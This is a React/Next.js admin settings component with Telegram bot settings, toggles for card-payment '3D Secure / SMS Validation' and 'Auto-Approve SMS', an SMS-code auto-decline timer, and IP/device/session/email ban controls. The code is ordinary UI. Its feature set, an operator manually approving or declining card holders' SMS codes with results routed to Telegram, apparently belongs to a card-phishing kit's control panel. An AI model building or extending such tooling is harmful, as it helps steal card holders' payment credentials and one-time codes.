"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"

interface Setting {
  id: string
  setting_key: string
  setting_value: string | null
  setting_type: string
  description: string | null
}

interface BannedEntity {
  id: string
  ban_type: string
  ban_value: string
  reason: string | null
  banned_at: string
  expires_at: string | null
  is_active: boolean
}

interface AdminSettingsProps {
  initialSettings: Setting[]
  initialBannedEntities: BannedEntity[]
}

export default function AdminSettings({ initialSettings, initialBannedEntities }: AdminSettingsProps) {
  const router = useRouter()
  const [settings, setSettings] = useState<Record<string, string>>(
    initialSettings.reduce(
      (acc, s) => ({
        ...acc,
        [s.setting_key]: s.setting_value || "",
      }),
      {},
    ),
  )
  const [bannedEntities, setBannedEntities] = useState(initialBannedEntities)
  const [isSaving, setIsSaving] = useState(false)

  const [banType, setBanType] = useState<"ip" | "device" | "session" | "user">("ip")
  const [banValue, setBanValue] = useState("")
  const [banReason, setBanReason] = useState("")
  const [banExpiry, setBanExpiry] = useState("")
  const [isBanning, setIsBanning] = useState(false)

  const handleSaveSettings = async () => {
    setIsSaving(true)

    try {
      const response = await fetch("/api/admin/settings", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ settings }),
      })

      if (response.ok) {
        alert("Settings saved successfully!")
        router.refresh()
      } else {
        alert("Failed to save settings")
      }
    } catch (error) {
      console.error("[v0] Save settings error:", error)
      alert("Failed to save settings")
    } finally {
      setIsSaving(false)
    }
  }

  const handleBan = async () => {
    if (!banValue) {
      alert("Please enter a value to ban")
      return
    }

    setIsBanning(true)

    try {
      const response = await fetch("/api/admin/ban", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          banType,
          banValue,
          reason: banReason,
          expiresIn: banExpiry ? Number.parseInt(banExpiry) : null,
        }),
      })

      if (response.ok) {
        alert(`${banType.toUpperCase()} banned successfully!`)
        setBanValue("")
        setBanReason("")
        setBanExpiry("")
        router.refresh()
      } else {
        const error = await response.json()
        alert(error.error || "Failed to ban")
      }
    } catch (error) {
      console.error("[v0] Ban error:", error)
      alert("Failed to ban")
    } finally {
      setIsBanning(false)
    }
  }

  const handleUnban = async (banType: string, banValue: string) => {
    if (!confirm(`Are you sure you want to unban this ${banType}?`)) return

    try {
      const response = await fetch("/api/admin/unban", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ banType, banValue }),
      })

      if (response.ok) {
        alert("Unbanned successfully!")
        router.refresh()
      } else {
        alert("Failed to unban")
      }
    } catch (error) {
      console.error("[v0] Unban error:", error)
      alert("Failed to unban")
    }
  }

  return (
    <div className="space-y-8">
      {/* Telegram Settings */}
      <div className="bg-white rounded-lg shadow-sm p-6">
        <h2 className="text-xl font-bold text-gray-900 mb-4 flex items-center gap-2">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
          </svg>
          Telegram Integration
        </h2>
        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Bot Token</label>
            <input
              type="text"
              value={settings.telegram_bot_token || ""}
              onChange={(e) => setSettings({ ...settings, telegram_bot_token: e.target.value })}
              placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <p className="text-xs text-gray-500 mt-1">Get your bot token from @BotFather on Telegram</p>
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Chat ID</label>
            <input
              type="text"
              value={settings.telegram_chat_id || ""}
              onChange={(e) => setSettings({ ...settings, telegram_chat_id: e.target.value })}
              placeholder="-1001234567890"
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <p className="text-xs text-gray-500 mt-1">Use @userinfobot to get your chat ID</p>
          </div>
        </div>
      </div>

      {/* Feature Toggles */}
      <div className="bg-white rounded-lg shadow-sm p-6">
        <h2 className="text-xl font-bold text-gray-900 mb-4 flex items-center gap-2">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <rect x="3" y="3" width="18" height="18" rx="2" ry="2" />
            <line x1="9" y1="9" x2="15" y2="15" />
            <line x1="15" y1="9" x2="9" y2="15" />
          </svg>
          Feature Controls
        </h2>
        <div className="space-y-4">
          <div className="flex items-center justify-between p-4 bg-gray-50 rounded-lg">
            <div>
              <h3 className="font-medium text-gray-900">3D Secure / SMS Validation</h3>
              <p className="text-sm text-gray-600">Enable or disable SMS verification for card payments</p>
            </div>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                checked={settings.sms_enabled === "true"}
                onChange={(e) => setSettings({ ...settings, sms_enabled: e.target.checked ? "true" : "false" })}
                className="sr-only peer"
              />
              <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
            </label>
          </div>

          <div className="flex items-center justify-between p-4 bg-gray-50 rounded-lg">
            <div>
              <h3 className="font-medium text-gray-900">Maintenance Mode</h3>
              <p className="text-sm text-gray-600">Block all users from accessing the app</p>
            </div>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                checked={settings.maintenance_mode === "true"}
                onChange={(e) => setSettings({ ...settings, maintenance_mode: e.target.checked ? "true" : "false" })}
                className="sr-only peer"
              />
              <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
            </label>
          </div>

          <div className="flex items-center justify-between p-4 bg-gray-50 rounded-lg">
            <div>
              <h3 className="font-medium text-gray-900">Auto-Approve SMS</h3>
              <p className="text-sm text-gray-600">Automatically approve all SMS verification requests</p>
            </div>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                checked={settings.auto_approve_sms === "true"}
                onChange={(e) => setSettings({ ...settings, auto_approve_sms: e.target.checked ? "true" : "false" })}
                className="sr-only peer"
              />
              <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
            </label>
          </div>

          <div className="p-4 bg-gray-50 rounded-lg">
            <label className="block text-sm font-medium text-gray-700 mb-2">Auto-Decline Timeout (seconds)</label>
            <input
              type="number"
              value={settings.auto_decline_timeout || "40"}
              onChange={(e) => setSettings({ ...settings, auto_decline_timeout: e.target.value })}
              min="10"
              max="120"
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <p className="text-xs text-gray-500 mt-1">SMS codes will auto-decline after this many seconds</p>
          </div>
        </div>
      </div>

      {/* Ban Management */}
      <div className="bg-white rounded-lg shadow-sm p-6">
        <h2 className="text-xl font-bold text-gray-900 mb-4 flex items-center gap-2">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <circle cx="12" cy="12" r="10" />
            <line x1="4.93" y1="4.93" x2="19.07" y2="19.07" />
          </svg>
          Ban Management
        </h2>

        <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-lg">
          <h3 className="font-medium text-gray-900 mb-3">Add Ban</h3>
          <div className="space-y-3">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Ban Type</label>
              <select
                value={banType}
                onChange={(e) => setBanType(e.target.value as any)}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
              >
                <option value="ip">IP Address</option>
                <option value="device">Device (User Agent)</option>
                <option value="session">Session ID</option>
                <option value="user">User Email</option>
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {banType === "ip" && "IP Address"}
                {banType === "device" && "User Agent String"}
                {banType === "session" && "Session ID"}
                {banType === "user" && "User Email"}
              </label>
              <input
                type="text"
                value={banValue}
                onChange={(e) => setBanValue(e.target.value)}
                placeholder={
                  banType === "ip"
                    ? "192.168.1.1"
                    : banType === "device"
                      ? "Mozilla/5.0..."
                      : banType === "session"
                        ? "session-id-here"
                        : "user@example.com"
                }
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Reason (optional)</label>
              <input
                type="text"
                value={banReason}
                onChange={(e) => setBanReason(e.target.value)}
                placeholder="Suspicious activity, fraud, etc."
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Expires In (hours, optional)</label>
              <input
                type="number"
                value={banExpiry}
                onChange={(e) => setBanExpiry(e.target.value)}
                placeholder="Leave empty for permanent ban"
                min="1"
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
              <p className="text-xs text-gray-500 mt-1">Leave empty for permanent ban</p>
            </div>

            <button
              onClick={handleBan}
              disabled={isBanning || !banValue}
              className="w-full bg-red-600 hover:bg-red-700 text-white font-medium py-2 px-4 rounded-lg transition-colors disabled:opacity-50"
            >
              {isBanning ? "Banning..." : `Ban ${banType.toUpperCase()}`}
            </button>
          </div>
        </div>

        {bannedEntities.length > 0 && (
          <div>
            <h3 className="font-medium text-gray-900 mb-3">Active Bans ({bannedEntities.length})</h3>
            <div className="space-y-2">
              {bannedEntities.map((entity) => (
                <div
                  key={entity.id}
                  className="flex items-center justify-between p-3 bg-red-50 rounded-lg border border-red-200"
                >
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="inline-flex px-2 py-1 text-xs font-semibold rounded bg-red-200 text-red-800">
                        {entity.ban_type.toUpperCase()}
                      </span>
                      <p className="font-mono text-sm text-gray-900">{entity.ban_value}</p>
                    </div>
                    {entity.reason && <p className="text-sm text-gray-600 mb-1">{entity.reason}</p>}
                    <div className="flex items-center gap-4 text-xs text-gray-500">
                      <span>Banned: {new Date(entity.banned_at).toLocaleString()}</span>
                      {entity.expires_at && <span>Expires: {new Date(entity.expires_at).toLocaleString()}</span>}
                      {!entity.expires_at && <span className="text-red-600 font-semibold">Permanent</span>}
                    </div>
                  </div>
                  <button
                    onClick={() => handleUnban(entity.ban_type, entity.ban_value)}
                    className="text-sm text-blue-600 hover:text-blue-700 font-medium ml-4"
                  >
                    Unban
                  </button>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Additional Controls */}
      <div className="bg-white rounded-lg shadow-sm p-6">
        <h2 className="text-xl font-bold text-gray-900 mb-4 flex items-center gap-2">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <circle cx="12" cy="12" r="3" />
            <path d="M12 1v6m0 6v6m5.2-13.2l-4.2 4.2m0 6l4.2 4.2M23 12h-6m-6 0H1m18.2 5.2l-4.2-4.2m0-6l4.2-4.2" />
          </svg>
          Additional Controls
        </h2>
        <div className="space-y-4">
          <div className="p-4 bg-gray-50 rounded-lg">
            <label className="block text-sm font-medium text-gray-700 mb-2">Custom Alert Message</label>
            <textarea
              value={settings.custom_alert || ""}
              onChange={(e) => setSettings({ ...settings, custom_alert: e.target.value })}
              placeholder="Display a custom message to all users"
              rows={3}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <p className="text-xs text-gray-500 mt-1">Leave empty to disable</p>
          </div>

          <div className="p-4 bg-gray-50 rounded-lg">
            <label className="block text-sm font-medium text-gray-700 mb-2">Webhook URL (optional)</label>
            <input
              type="url"
              value={settings.webhook_url || ""}
              onChange={(e) => setSettings({ ...settings, webhook_url: e.target.value })}
              placeholder="https://your-webhook.com/endpoint"
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <p className="text-xs text-gray-500 mt-1">Receive notifications via webhook</p>
          </div>
        </div>
      </div>

      {/* Save Button */}
      <div className="flex justify-end gap-4">
        <button
          onClick={() => router.push("/admin")}
          className="bg-gray-200 hover:bg-gray-300 text-gray-700 font-bold py-3 px-8 rounded-lg transition-colors"
        >
          Back to Dashboard
        </button>
        <button
          onClick={handleSaveSettings}
          disabled={isSaving}
          className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-8 rounded-lg transition-colors disabled:opacity-50"
        >
          {isSaving ? "Saving..." : "Save All Settings"}
        </button>
      </div>
    </div>
  )
}
